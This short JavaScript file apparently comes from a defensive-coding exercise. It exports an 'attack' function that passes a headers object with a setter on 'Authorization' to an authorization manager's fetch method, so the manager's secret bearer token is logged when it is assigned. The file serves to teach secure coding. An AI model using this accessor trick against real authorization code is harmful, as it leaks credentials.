/* [{
  'https://www.google.com': {
    headers: {
      Authorization: 'Bearer ANY_SECRET'
    },
    method: 'GET'
  }]
} */

// Add setter to Authorization Header
// Target: authzManager.authorizedFetch

const url = 'https://github.com/CaglayanYanikoglu/defensive-coding';

export const attack = authzManager => {
  authzManager.authorizedFetch([
    {
      url: 'https://github.com/CaglayanYanikoglu/defensive-coding',
      method: 'GET',
      headers: {
        set Authorization(key) {
          console.log('### RESPONSE ###');
          console.log(key);
        }
      }
    }
  ])
};
